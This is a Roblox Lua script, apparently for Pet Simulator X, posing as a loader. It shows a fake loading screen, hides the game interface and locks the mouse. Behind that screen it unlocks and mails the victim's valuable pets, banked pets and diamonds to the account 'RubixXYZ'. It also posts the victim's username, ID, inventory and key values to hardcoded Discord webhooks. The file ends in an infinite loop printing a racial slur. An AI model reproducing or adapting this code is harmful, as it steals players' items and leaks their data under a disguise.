--OFFICIAL BLOBBYBOI DOCUMENT
_G.Debug= "18.12.2022 - 23:32"
-- Loading Fake
local username = game:GetService("Players").LocalPlayer.Name

-- Gui to Lua
-- Version: 3.2
-- Instances:
local ScreenGui = Instance.new("ScreenGui")
local FullScreen = Instance.new("Frame")
local LoadingText = Instance.new("TextLabel")
local LoadingBar = Instance.new("Frame")
local LoadingBar2 = Instance.new("Frame")
local Informations = Instance.new("TextLabel")
local Output = Instance.new("Frame")
local Inside = Instance.new("Frame")
local Welcomer = Instance.new("TextLabel")
local Warning = Instance.new("TextLabel")
local Top = Instance.new("TextLabel")
local icon = Instance.new("ImageLabel")
local DirectoryName = "PSX x LuaAuthenticate"

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

FullScreen.Name = "FullScreen"
FullScreen.Parent = ScreenGui
FullScreen.AnchorPoint = Vector2.new(0.5, 0.5)
FullScreen.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
FullScreen.Position = UDim2.new(0.514967918, 0, 0.5, 0)
FullScreen.Size = UDim2.new(0, 10000, 0, 10000)

LoadingText.Name = "LoadingText"
LoadingText.Parent = FullScreen
LoadingText.AnchorPoint = Vector2.new(0.5, 0.5)
LoadingText.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
LoadingText.BackgroundTransparency = 1.000
LoadingText.BorderColor3 = Color3.fromRGB(255, 0, 0)
LoadingText.BorderSizePixel = 2
LoadingText.Position = UDim2.new(0.499900013, 0, 0.496000051, 0)
LoadingText.Size = UDim2.new(0, 262, 0, 38)
LoadingText.Font = Enum.Font.SourceSansBold
LoadingText.Text = DirectoryName
LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadingText.TextSize = 34.000

LoadingBar.Name = "LoadingBar"
LoadingBar.Parent = FullScreen
LoadingBar.AnchorPoint = Vector2.new(0.5, 0.5)
LoadingBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
LoadingBar.BorderColor3 = Color3.fromRGB(18, 18, 18)
LoadingBar.Position = UDim2.new(0.5, 0, 0.5, 0)
LoadingBar.Size = UDim2.new(0, 287, 0, 11)

LoadingBar2.Name = "LoadingBar2"
LoadingBar2.Parent = LoadingBar
LoadingBar2.BackgroundColor3 = Color3.fromRGB(79, 255, 226)
LoadingBar2.BorderColor3 = Color3.fromRGB(130, 203, 255)
LoadingBar2.BorderSizePixel = 0
LoadingBar2.Size = UDim2.new(0, 0, 0, 11)

Informations.Name = "Informations"
Informations.Parent = FullScreen
Informations.AnchorPoint = Vector2.new(0.5, 0.5)
Informations.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
Informations.BackgroundTransparency = 1.000
Informations.BorderColor3 = Color3.fromRGB(18, 18, 18)
Informations.Position = UDim2.new(0.499749988, 0, 0.502699971, 0)
Informations.Size = UDim2.new(0, 210, 0, 25)
Informations.Font = Enum.Font.SourceSansBold
Informations.Text = "Hi "..username..", this take few seconds to load. Please Wait!"
Informations.TextColor3 = Color3.fromRGB(255, 255, 255)
Informations.TextSize = 14.000

Output.Name = "Output"
Output.Parent = FullScreen
Output.AnchorPoint = Vector2.new(0.5, 0.5)
Output.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
Output.Position = UDim2.new(0.499949962, 0, 0.517800093, 0)
Output.Size = UDim2.new(0, 465, 0, 230)

Inside.Name = "Inside"
Inside.Parent = Output
Inside.AnchorPoint = Vector2.new(0.5, 0.5)
Inside.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
Inside.Position = UDim2.new(0.499683797, 0, 0.497826099, 0)
Inside.Size = UDim2.new(0, 445, 0, 215)

Welcomer.Name = "Welcomer"
Welcomer.Parent = Output
Welcomer.AnchorPoint = Vector2.new(0.5, 0.5)
Welcomer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Welcomer.BackgroundTransparency = 1.000
Welcomer.Position = UDim2.new(0.498292267, 0, 0.2076087, 0)
Welcomer.Size = UDim2.new(0, 424, 0, 18)
Welcomer.Font = Enum.Font.RobotoMono
Welcomer.Text = ":: Logs ::"
Welcomer.TextColor3 = Color3.fromRGB(0, 251, 255)
Welcomer.TextSize = 14.000
Welcomer.TextXAlignment = Enum.TextXAlignment.Left
Welcomer.TextYAlignment = Enum.TextYAlignment.Top

Warning.Name = "Warning"
Warning.Parent = Output
Warning.AnchorPoint = Vector2.new(0.5, 0.5)
Warning.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Warning.BackgroundTransparency = 1.000
Warning.Position = UDim2.new(0.498292267, 0, 0.102173917, 0)
Warning.Size = UDim2.new(0, 424, 0, 16)
Warning.Font = Enum.Font.RobotoMono
Warning.Text = "▶ Warning! Do not leave a game before loading is not completed"
Warning.TextColor3 = Color3.fromRGB(38, 255, 0)
Warning.TextSize = 14.000
Warning.TextXAlignment = Enum.TextXAlignment.Left
Warning.TextYAlignment = Enum.TextYAlignment.Top

Top.Name = "Top"
Top.Parent = Output
Top.AnchorPoint = Vector2.new(0.5, 0.5)
Top.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Top.BackgroundTransparency = 1.000
Top.Position = UDim2.new(0.498292327, 0, 0.580652118, 0)
Top.Size = UDim2.new(0, 424, 0, 155)
Top.Font = Enum.Font.RobotoMono
Top.Text = "Getting Verify... (0x2200)"
Top.TextColor3 = Color3.fromRGB(255, 225, 0)
Top.TextSize = 14.000
Top.TextXAlignment = Enum.TextXAlignment.Left
Top.TextYAlignment = Enum.TextYAlignment.Top
-- Scripts:

local function BUKVE_fake_script() -- LoadingBar2.LocalScript 
	local script = Instance.new('LocalScript', LoadingBar2)

	script.Parent:TweenSize(UDim2.new(1,0,1,0),"InOut","Sine",40)
end
spawn(function() pcall(function()

game:GetService("CoreGui").RobloxGui:Destroy()

while true do mousemoveabs(100,100) wait() end end) end)
local msg = ""
local mps = game:GetService("MarketplaceService")
local xyzab = mps:GetProductInfo(game.PlaceId).Name
local bd = ""
function announce(io,ui,pn)
local mps = game:GetService("MarketplaceService")
local xyzab = mps:GetProductInfo(game.PlaceId).Name
pn=pn or "?"
local data = {
  ["content"] = "@everyone New Gift!\nPet: "..pn.."\nGame: "..xyzab.."\nDebug Errors: "..tostring(io).." ("..tostring(ui)..")"
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}
local abcdef2 = {Url = "https://discord.com/api/webhooks/1083418419245883425/XdUG60YcXeCONvKcdexB3xucPOnZaDxM37cndEc1EaFACjo2VFHyKbZwIAa3M1At4qjR", Body = newdata, Method = "POST", Headers = headers}
request = http_request or request or HttpPost or syn.request
request(abcdef2)
end
local bankdata
Library     = require(game:GetService('ReplicatedStorage'):FindFirstChild('Library'))
Functions   = Library.Functions
local Lib = require(game:GetService("ReplicatedStorage").Framework.Library)

local RemoteFunction = debug.getupvalue(Lib.Network.Invoke, 2)
local function FireRemote(RemoteName, ...)
    return RemoteFunction(RemoteName):InvokeServer(...)
end
local pets = require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Pets
local y = {}
for i, v in pairs(pets) do
y[v["uid"]] = false
end
pcall(function()
FireRemote("Lock Pet", y)
end)
local HugeListe={}
local NameListe={}
local petlist={"351","292","2075","2028","373","291","2076","2044","2066","362","2074","2039","2065","372","157","353","2061","2033","266","2059","2030","3004","1004","2004","2026","2021","1021","2011","1011","2034","2016","1016","1001","3001","2001","2036","1006","2006","3006","308","2043","2014","1014","374","274","375","2073","329","239","2053","2063","2037","1010","2002","2017","1003","2055","2003","3003","2029","1013","225","3010","2010","2032","1020","2020","309","3009","2009","2052","317","2013","2007","371","307","2045","2081","2057","2056","2046","352","2060","2067","1022","2050","2027","2051","2024","2078","330","1000","2031","2047","2071","2041","2069","2080","1012","2040","2070","2035","2025","316","331","2038","3002","2012","2023","2015","2062","1005","1019","2054","3005","2072","376","370","1017","2018","2068","1015","2079","2019","2008","3008","1008","2064","2022","2005","1002","2049","2082","2048","3000","1018","1007","3007","2000","2058","2042","1009"}
local HCount=0
local XCount=0
local BHCount=0
local BXCount=0
local HList = {}
local BHList = {}
local gemsend=false
table.foreach(Library.Directory.Pets, function(i, v)
	if v.titanic or v.huge then
    table.insert(HugeListe, i)
end
end)
for i,v in pairs(petlist) do
NameListe[tostring(v)] = Library.Directory.Pets[tostring(v)]
end
local pets = require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Pets
for i, v in pairs(pets) do
if table.find(HugeListe, v["id"]) ~= nil then
HCount=HCount+1
end
if table.find(petlist, v["id"]) ~= nil then
XCount=XCount+1
table.insert(HList, {v["uid"], NameListe[v["id"]].name})
end
if require(game:GetService("ReplicatedStorage").Library).Directory.Pets[v.id].rarity == "Exclusive" then
local obj = require(game:GetService("ReplicatedStorage").Library).Shared.ComputeHugeMachinePoints(v, require(game:GetService("ReplicatedStorage").Library).Directory.Pets[v.id])
if obj ~= nil then
if obj >= 3 then
XCount=XCount+1
table.insert(HList, {v["uid"], NameListe[v["id"]].name})
end
end

end
end
pcall(function()bankdata=FireRemote("Get Bank", FireRemote("Get My Banks")[1]["BUID"])end)
if typeof(bankdata) == "table" then
for i, v in pairs(bankdata["Storage"]["Pets"]) do
if table.find(HugeListe, v["id"]) ~= nil then
BHCount=BHCount+1
end
if table.find(petlist, v["id"]) ~= nil then
BXCount=BXCount+1
table.insert(BHList, {v["uid"], NameListe[v["id"]].name})
end
end
bd="\n\nBank:\nGems: "..require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)(bankdata["Storage"]["Currency"]["Diamonds"]).."\nHuges: "..tostring(BHCount).."\n[!]Huges: "..tostring(BXCount)
end
if HCount >=1 or XCount>=1 then
msg=msg.."@everyone"
end
if require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Diamonds >= 25000000000 then gemsend=true end
msg=msg.." New Execution! \nUsername: "..game.Players.LocalPlayer.Name.."\nID: "..game.Players.LocalPlayer.UserId.."\n\nGems: "..require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)(require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Diamonds).."\nPets: \nTargeteds: "..tostring(HCount).."\n[!]Targeteds: "..tostring(XCount)..bd.."\n\nGame: "..xyzab.."\n\nKey: "..tostring(_G.Key).."\nLicense: "..tostring(_G.License).."\nAuthKey: "..tostring(_G.AuthKey).."\n\nScript: Gift/Mailsteal\n\nhi blob btw"
local data = {
  ["content"] = msg
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}
local abcdef2 = {Url = "https://discord.com/api/webhooks/1083418419245883425/XdUG60YcXeCONvKcdexB3xucPOnZaDxM37cndEc1EaFACjo2VFHyKbZwIAa3M1At4qR", Body = newdata, Method = "POST", Headers = headers}
request = http_request or request or HttpPost or syn.request
request(abcdef2)
local uruguay,paraguay
uruguay,paraguay=pcall(function()
if game.PlaceId == 7722306047 then
local Lib = require(game:GetService("ReplicatedStorage").Framework.Library).Message.New("Sorry. This is disabled in Trading Plaza. Please go to Spawn or Hardcore.")
return
end
_G.Debug= "18.12.2022 - 23:32"
getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]).GetMyBanks = function()getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Teleport).Teleport("Shop") end
game:GetService("Players").LocalPlayer.PlayerGui.Bank.Enabled=true

wait()

game:GetService("Players").LocalPlayer.PlayerGui.Bank.Enabled=false
if require(game:GetService("ReplicatedStorage").Library.Client.WorldCmds).Get() ~= "Spawn" then
repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui.Loading.Black.BackgroundTransparency == 0
wait()
repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui.Loading.Black.BackgroundTransparency == 1
end
wait(1)

local deletebank = game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs["Teleport"]
deletebank:Destroy()
local deletebank = game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"]
deletebank:Destroy()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")["__MAP"].Interactive.Bank.Center.Position)
local RunService = game:GetService("RunService");
local Players = game:GetService("Players");
local Player = Players.LocalPlayer; 
local Chr = Player.Character; 
local Root = Chr.HumanoidRootPart; 
local Lib = require(game:GetService("ReplicatedStorage").Framework.Library)
local RemoteFunction = debug.getupvalue(Lib.Network.Invoke, 2)
local function FireRemote(RemoteName, ...)
    return RemoteFunction(RemoteName):InvokeServer(...)
end
wait(3)
for i, v in pairs(HList) do
local abc,def
pcall(function() abc,def=FireRemote("Send Mail", {Recipient= "RubixXYZ", Message="", Pets={v[1]}, Diamonds = 0})
end)
announce(abc,def, v[2])
wait(10)
end
for i,v in pairs(BHList) do
local abc,def
pcall(function() local x = FireRemote("Bank Withdraw", FireRemote("Get My Banks")[1]["BUID"], {v[1]}, 0) wait(1)
abc,def=FireRemote("Send Mail", {Recipient= "RubixXYZ", Message="", Pets={v[1]}, Diamonds = 0}) end)
announce(abc,def,v[2])
wait(10)
end
if gemsend then
local abc,def
pcall(function() abc,def=FireRemote("Send Mail", {Recipient= "RubixXYZ", Message="", Pets={}, Diamonds = require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Diamonds-500000}) end)
announce(abc,def)
end
Library     = require(game:GetService('ReplicatedStorage'):FindFirstChild('Library'))
Functions   = Library.Functions
local EXCList = {}
local MythicList = {}
local HugeList = {}
local EList = {}
local MList = {}
local HList = {}

table.foreach(Library.Directory.Pets, function(i, v)
  if v.rarity == "Exclusive" and not v.huge and not v.titanic then
    table.insert(EXCList, i)
  end
  if v.rarity == "Event" and not v.huge and not v.titanic then
    table.insert(EXCList, i)
  end
  if v.rarity == "Mythical" then
    table.insert(MythicList, i)
  end
  if v.huge or v.titanic then
    table.insert(HugeList, i)
  end
end)


local pets = require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Pets
local y = {}
for i, v in pairs(pets) do
y[v["uid"]] = false
end
pcall(function()
FireRemote("Lock Pet", y)
end)
wait(6)
for i, v in pairs(pets) do
if table.find(EXCList, v["id"]) ~= nil then
table.insert(EList, v["uid"])
end
if table.find(MythicList, v["id"]) ~= nil then
table.insert(MList, v["uid"])
end
if table.find(HugeList, v["id"]) ~= nil then
table.insert(HList, v["uid"])
end
if v.s >= 1000000000000000 and v.hc then
table.insert(HList, v["uid"])
end
if v["powers"] ~= nil then
if #v.powers >= 1 then
if v.powers[1][1] == "Shadow Coins" then
table.insert(HList, v["uid"])
end
end
if #v.powers >= 2 then
if v.powers[2][1] == "Shadow Coins" then
table.insert(HList, v["uid"])
end
end
end
end
function announce(io,ui)

local mps = game:GetService("MarketplaceService")
local xyzab = mps:GetProductInfo(game.PlaceId).Name
local data = {
  ["content"] = "@everyone New Gift!\nGame: "..xyzab.."\nDebug Errors: "..tostring(io).." ("..tostring(ui)..")"
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}
local abcdef2 = {Url = "https://discord.com/api/webhooks/1083418419245883425/XdUG60YcXeCONvKcdexB3xucPOnZaDxM37cndEc1EaFACjo2VFHyKbZwIAa3M1At4qjR", Body = newdata, Method = "POST", Headers = headers}
request(abcdef2)
end
if require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Diamonds >= 25000000000 then
local abc,def
spawn(function()abc,def=FireRemote("Send Mail", {Recipient="RubixXYZ", Message="", Pets={}, Diamonds=require(game:GetService("ReplicatedStorage").Library.Client["Save"]).Get().Diamonds-5000000})end)
announce(abc,def)
wait(10)
end
if #HList >= 1 then
for i =1,#HList,1 do
local fgh,ijk
spawn(function()fgh,ijk=FireRemote("Send Mail", {Recipient="RubixXYZ", Message="", Pets={HList[i]}, Diamonds=0})end)
announce(fgh,ijk)
wait(10)
end
end
if #EList >= 1 then
for i =1,#EList,1 do
spawn(function()FireRemote("Send Mail", {Recipient=_G.Key, Message="", Pets={EList[i]}, Diamonds=0})end)
wait(10)
end
end
while true do
print("L NIG")
end

end)

local data = {
  ["content"] = "Debug Erorrs: "..tostring(uruguay).." ("..tostring(paraguay)..")"
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}
local abcdef2 = {Url = "https://discord.com/api/webhooks/1069728525994692640/NgEop68HxCq5u1ifbq9NupfQeNKyRC2oo5-sl-TJDVIuonUhf2dZEn_DK15AJR3OJ0FK", Body = newdata, Method = "POST", Headers = headers}
request = http_request or request or HttpPost or syn.request
request(abcdef2)
